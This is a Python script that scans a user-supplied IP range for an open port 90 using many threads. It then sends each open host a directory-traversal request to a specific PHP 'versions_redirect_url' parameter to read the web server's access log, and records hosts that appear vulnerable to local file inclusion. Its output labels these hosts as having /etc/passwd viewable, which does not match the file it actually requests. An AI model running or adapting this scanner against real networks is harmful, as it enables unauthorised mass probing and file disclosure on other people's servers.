import socket
import ipaddress
from ipaddress import IPv4Address, IPv4Network
import threading
from queue import Queue
import requests

count = 0
iplist = []
iprange = input("Enter IP range to check: ").strip()
port2 = 90
numthreads = input("Enter the number of threads (For Mac, use a max of 250 unless you up the ulimit...on kali and most linux distros use a max of 1000 unless you up the ulimit): ").strip()
outfile = open("outfile.txt","w")
portopenlist = []

def Connector(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.6)
        result = sock.connect_ex((str(ip),port2))
        sock.close()
        if result == 0:
            print("\033[92mPort " + str(port2) + " OPEN on %s\033[0m" % str(ip))
            outfile.write("Port " + str(port2) + " OPEN on %s\n" % str(ip))
            portopenlist.append(str(ip))
        
    except Exception as e:
        print(e)

def threader():
    while True:
        worker = q.get()
        Connector(worker)
        q.task_done()

q = Queue()

for ip in ipaddress.IPv4Network(iprange):
    count = count + 1
    iplist.append(str(ip))
    
for x in range(int(numthreads)):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()

for worker in iplist:
    q.put(worker)

q.join()



vulnerable = []

for host in portopenlist:
    url = "http://" + host + ":" + str(port2) + "/devtools/www/desktop/sync4/versions/index.php?versions_redirect_url=../../../../../../../var/log/httpd/access_log"
    response = requests.get(url)
    if (response.status_code == 200 and 'GET' in response.text):
        print("+"*40)
        print("\033[91mHost with /etc/passwd viewable:\033[0m")
        outfile.write("Host with /etc/passwd viewable:\n")
        outfile.write(url)
        outfile.write("\n")
        vulnerable.append(host)
        print(url)
    else:
        pass

if vulnerable == []:
    print("+"*40)
    print("No no LFI vulns found.")
    outfile.write("No LFI vulns found.\n")

outfile.close()        
print("+"*40)
print("DONE!")
print("Data written to outfile.txt in the current directory.")
print("+"*40)
